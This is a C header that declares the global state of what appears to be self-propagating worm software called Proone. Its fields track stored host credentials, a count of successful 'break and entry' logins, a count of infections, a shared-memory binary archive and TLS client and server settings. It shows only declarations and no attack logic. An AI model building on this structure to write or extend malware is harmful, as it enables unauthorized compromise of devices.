#include "pack.h"
#include "rnd.h"

#include <stdint.h>
#include <stdbool.h>
#include <time.h>

#include <sys/types.h>

#include <mbedtls/ssl.h>


struct prne_global {
    uint8_t *host_cred_data;
    size_t host_cred_size;
    char *ny_bin_shm_name;
    prne_rnd_engine_t *rnd;
    struct timespec god_start;
    uint64_t run_cnt;
    int caught_signal;
    pid_t god_pid;
    pid_t proone_pid;
    int lock_shm_fd;
    int ny_bin_shm_fd;
    bool bin_ready;
    bool s_ssl_ready;
    bool c_ssl_ready;
    
    prne_unpack_bin_archive_result_t bin_pack;
    prne_bin_archive_t bin_archive;

    mbedtls_x509_crt ca;
    struct {
        mbedtls_ssl_config conf;
        mbedtls_x509_crt crt;
        mbedtls_pk_context pk;
        mbedtls_dhm_context dhm;
    } s_ssl;
    struct {
        mbedtls_ssl_config conf;
        mbedtls_x509_crt crt;
        mbedtls_pk_context pk;
    } c_ssl;
};

struct prne_shared_global {
    // "break and entry" count. Number of successful logins.
    uint64_t bne_cnt;
    // Number of successful infections.
    uint64_t infect_cnt;
    bool has_ny_bin;
};


extern struct prne_global prne_g;
extern struct prne_shared_global *prne_s_g;
